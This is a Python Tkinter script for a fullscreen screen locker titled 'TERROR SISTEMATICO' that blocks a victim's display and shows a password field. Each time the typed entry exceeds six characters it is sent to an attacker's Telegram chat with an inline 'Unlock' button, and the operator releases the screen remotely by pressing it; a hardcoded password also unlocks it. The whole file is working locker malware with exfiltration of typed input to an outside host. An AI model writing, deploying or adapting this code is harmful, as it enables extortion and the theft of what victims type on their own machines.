from tkinter import *
import requests
import json
from io import BytesIO
from PIL import Image, ImageTk
import threading
import time
import os
import uuid


TELEGRAM_BOT_TOKEN = ""
CHAT_ID = ""
TELEGRAM_API_URL = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}"

password = "123456"
unlocked = False  

device_id = f"{uuid.getnode()}-{os.getpid()}"

def unlock(callback_query_id):
    global unlocked, wind
    if not unlocked:
        unlocked = True
        wind.destroy()
        requests.post(f"{TELEGRAM_API_URL}/answerCallbackQuery", data={
            "callback_query_id": callback_query_id,
            "text": "El sistema ya fue desbloqueado",
            "show_alert": True
        })

def send_telegram_message(token):
    keyboard = {
        "inline_keyboard": [[{"text": "🔓 Unlock", "callback_data": device_id}]]
    }
    data = {
        "chat_id": CHAT_ID,
        "text": f"🔑 Token ingresado: {token}",
        "reply_markup": json.dumps(keyboard)
    }
    
    try:
        response = requests.post(f"{TELEGRAM_API_URL}/sendMessage", data=data)
        return response.status_code == 200
    except requests.exceptions.RequestException:
        return False

def poll_telegram():
    global unlocked
    offset = None
    while not unlocked:
        try:
            params = {"offset": offset, "timeout": 10}
            response = requests.get(f"{TELEGRAM_API_URL}/getUpdates", params=params).json()
            
            if "result" in response:
                for update in response["result"]:
                    offset = update["update_id"] + 1
                    if "callback_query" in update:
                        callback_data = update["callback_query"]["data"]
                        callback_query_id = update["callback_query"]["id"]
                        
                        if callback_data == device_id:
                            unlock(callback_query_id)
        except Exception:
            pass
        time.sleep(2)

def check():
    global wind
    entered_pass = enter_pass.get()
    if entered_pass == password:
        wind.destroy()

def on_key_release(event):
    token = enter_pass.get()
    if len(token) > 6:
        send_telegram_message(token)

def setup_ui():
    global wind, enter_pass, image_tk

    wind = Tk()
    wind.title(".")
    wind.configure(bg='black')
    wind.attributes('-alpha', 0.8)
    wind.attributes('-fullscreen', True)
    wind.resizable(0, 0)
    image_url = "https://i.ibb.co/BHv1qf55/vs2.png"
    response = requests.get(image_url)
    image = Image.open(BytesIO(response.content))
    image = image.resize((200, 200), Image.LANCZOS)
    image_tk = ImageTk.PhotoImage(image)

    Label(wind, bg="black", fg="#ff0000", text="TERROR SISTEMATICO", font="helvetica 30 bold").pack(pady=10)
    Label(wind, image=image_tk, bg="black").pack(pady=5)
    Label(wind, text="🔐", fg="white", bg="black", font="helvetica 16").pack(pady=5)

    enter_pass = Entry(wind, bg="#202020", bd=10, fg="white", show='•', font="helvetica 25", width=10, justify="center")
    enter_pass.pack(pady=5)
    enter_pass.bind("<KeyRelease>", on_key_release)

    Frame(wind, bg='black').pack(pady=5)
    
    threading.Thread(target=poll_telegram, daemon=True).start()
    wind.mainloop()

setup_ui()
